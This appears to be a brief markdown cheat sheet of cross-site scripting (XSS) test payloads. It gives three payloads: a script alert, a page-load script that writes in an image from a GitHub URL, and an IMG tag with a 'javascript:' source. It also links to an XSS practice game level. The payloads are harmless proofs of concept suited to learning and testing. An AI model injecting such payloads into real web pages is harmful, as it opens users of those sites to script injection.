# Alert
```js
<script>alert("Hello");</script>
```
# Image
```js
<script>function a() { document.write("<img src='https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp'></img>"); }; window.onload = a; alert("Hidden scripted image.");</script>
```
# Image XSS using the JavaScript directive

```js
<IMG SRC="javascript:alert('https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp');">
```

# Test 
```url
https://xss-game.appspot.com/level1
```
